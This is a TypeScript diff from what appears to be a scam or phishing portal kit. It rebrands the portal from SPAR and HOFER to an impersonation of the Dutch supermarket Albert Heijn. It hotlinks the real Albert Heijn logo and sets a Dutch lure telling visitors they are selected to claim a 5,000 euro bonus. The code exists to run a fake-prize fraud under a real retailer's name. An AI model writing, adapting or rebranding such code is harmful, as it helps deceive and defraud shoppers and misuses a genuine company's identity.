@@ -44,55 +44,39 @@ export type GlobalSettings = {
   profile_loading_text: string;
 };
 
-const ALBERT_HEIJN_LOGO_URL = "/albert-heijn-logo.svg";
+const ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
 const ALBERT_HEIJN_BG_URL = "/albert-heijn-bg.svg";
+const LEGACY_BG_URL = "/spar-bg.png";
+const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
+const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
+const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
+const LEGACY_WIN_SUBTITLE =
+  "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.";
 
 function normalizeBranding(settings: Partial<GlobalSettings>): Partial<GlobalSettings> {
   const next = { ...settings };
 
-  if (
-    !next.logo_url ||
-    next.logo_url === "/logo.png" ||
-    next.logo_url.toLowerCase().includes("spar") ||
-    next.logo_url.toLowerCase().includes("hofer")
-  ) {
+  if (!next.logo_url || next.logo_url === "/logo.png") {
     next.logo_url = ALBERT_HEIJN_LOGO_URL;
   }
 
-  if (
-    !next.bg_url ||
-    next.bg_url === "/spar-bg.png" ||
-    next.bg_url.toLowerCase().includes("spar") ||
-    next.bg_url.toLowerCase().includes("hofer")
-  ) {
+  if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
     next.bg_url = ALBERT_HEIJN_BG_URL;
   }
 
-  if (!next.portal_name || next.portal_name === "Kundenportal" || next.portal_name.includes("HOFER")) {
+  if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
     next.portal_name = "Albert Heijn klantenportaal";
   }
 
-  if (
-    !next.support_center_name ||
-    next.support_center_name === "Sonderaktion" ||
-    next.support_center_name.includes("HOFER")
-  ) {
+  if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
     next.support_center_name = "Albert Heijn service";
   }
 
-  if (
-    !next.win_title ||
-    next.win_title.includes("SPAR") ||
-    next.win_title.includes("HOFER")
-  ) {
+  if (!next.win_title || next.win_title === LEGACY_WIN_TITLE) {
     next.win_title = "Exclusieve Albert Heijn bonus";
   }
 
-  if (
-    !next.win_subtitle ||
-    next.win_subtitle.includes("Sonderaktion") ||
-    next.win_subtitle.includes("HOFER")
-  ) {
+  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE) {
     next.win_subtitle =
       "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.";
   }
